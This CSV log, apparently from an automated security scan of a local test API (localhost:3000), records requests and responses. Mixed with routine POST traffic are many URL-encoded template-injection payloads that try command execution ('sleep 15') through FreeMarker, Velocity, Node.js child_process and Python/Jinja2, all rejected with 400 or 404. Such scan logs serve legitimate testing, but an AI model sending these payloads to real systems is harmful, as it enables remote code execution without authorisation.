ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
3345,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,15,81,0
3346,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,41
3347,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3348,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%232935*4695%7Dzj,400,Bad Request,3,149,37
3349,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,41
3350,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,388
3351,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%408793*3986%7Dzj,400,Bad Request,4,149,37
3352,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,41
3353,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3354,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3355,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7B6915*3828%7D%7Dzj,400,Bad Request,3,149,37
3356,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,149,41
3357,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,12,81,0
3358,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,1,149,41
3359,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,1,158,388
3360,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7B%3D6415*7452%7D%7Dzj,400,Bad Request,3,149,37
3361,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,41
3362,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3363,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,41
3364,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3365,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%3C%25%3D4391*6537%25%3Ezj,400,Bad Request,4,149,37
3366,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,9,81,0
3367,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3368,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,41
3369,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,388
3370,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%23set%28%24x%3D6046*2037%29%24%7Bx%7Dzj,400,Bad Request,4,149,37
3371,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,149,41
3372,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3373,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%3Cp+th%3Atext%3D%22%24%7B9338*6520%7D%22%3E%3C%2Fp%3Ezj,400,Bad Request,4,149,37
3374,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3375,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,388
3376,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,9,81,0
3377,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%40math+key%3D%225190%22+method%3D%22multiply%22+operand%3D%228320%22%2F%7Dzj,400,Bad Request,4,149,37
3378,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3379,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3380,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7B33720%7Cadd%3A19240%7D%7Dzj,400,Bad Request,4,149,37
3381,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3382,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=nome&numeroCelular=numeroCelular&endereco=zj%7B%7Bprint+%229869%22+%226750%22%7D%7Dzj,400,Bad Request,3,149,37
3383,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3384,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3385,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,1,158,388
3386,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3387,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,12,81,0
3388,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3389,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3390,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3391,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,1,158,388
3392,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,10,81,0
3393,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,8,81,0
3394,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,11,81,0
3395,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,7,81,0
3396,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,8,81,0
3397,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,12,81,0
3398,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,9,81,0
3399,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,9,81,0
3400,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,9,81,0
3401,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,10,81,0
3402,Sat Jun 22 16:40:58 BRT 2024,Sat Jun 22 16:40:58 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,14,81,0
3403,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,19,81,0
3404,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3405,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3406,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3407,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3408,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,158,375
3409,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3410,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3411,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3412,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3413,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3414,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3415,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,158,376
3416,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,375
3417,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,158,375
3418,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3419,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3420,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3421,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3422,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,158,418
3423,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3424,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,158,418
3425,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3426,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3427,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3428,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,158,419
3429,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,419
3430,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,1,158,418
3431,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,2,158,418
3432,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000,404,Not Found,2,99,0
3433,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,149,58
3434,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api,404,Not Found,1,99,0
3435,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,388
3436,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,4,149,37
3437,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,1,149,58
3438,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,389
3439,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente,405,Method Not Allowed,3,129,0
3440,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,1,158,389
3441,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,149,58
3442,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,3,149,37
3443,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,400,Bad Request,7,158,319
3444,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,7,149,58
3445,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,8,158,389
3446,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,204,No Content,14,81,0
3447,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido,405,Method Not Allowed,7,121,0
3448,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,400,Bad Request,2,158,390
3449,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,58
3450,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,3,149,37
3451,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,5,158,389
3452,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,4,149,58
3453,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,400,Bad Request,5,158,328
3454,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,404,Not Found,5,99,0
3455,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,389
3456,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,4,149,37
3457,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,58
3458,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,400,Bad Request,3,158,327
3459,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,404,Not Found,3,99,0
3460,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Produto,400,Bad Request,10,150,101
3461,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,389
3462,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,1,149,58
3463,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,404,Not Found,2,99,0
3464,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,400,Bad Request,3,158,324
3465,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,5,149,37
3466,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,404,Not Found,1,99,0
3467,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,388
3468,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,4,149,58
3469,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,400,Bad Request,2,158,371
3470,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,404,Not Found,2,99,0
3471,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,4,149,37
3472,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,3,149,58
3473,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,3,158,388
3474,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,400,Bad Request,3,158,396
3475,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,404,Not Found,1,99,0
3476,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,404,Not Found,2,99,0
3477,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Cliente,400,Bad Request,2,149,58
3478,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,POST,http://localhost:3000/api/Pedido,400,Bad Request,2,158,388
3479,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,400,Bad Request,2,158,307
3480,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,404,Not Found,1,99,0
3481,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,DELETE,http://localhost:3000/api/Cliente?nome=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&numeroCelular=numeroCelular&endereco=endereco,400,Bad Request,4,149,37
3482,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,404,Not Found,1,99,0
3483,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Cliente/%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,400,Bad Request,2,158,308
3484,Sat Jun 22 16:40:59 BRT 2024,Sat Jun 22 16:40:59 BRT 2024,GET,http://localhost:3000/api/Pedido/%3C%25%3D%25x%28sleep+15%29%25%3E,404,Not Found,0,99,0
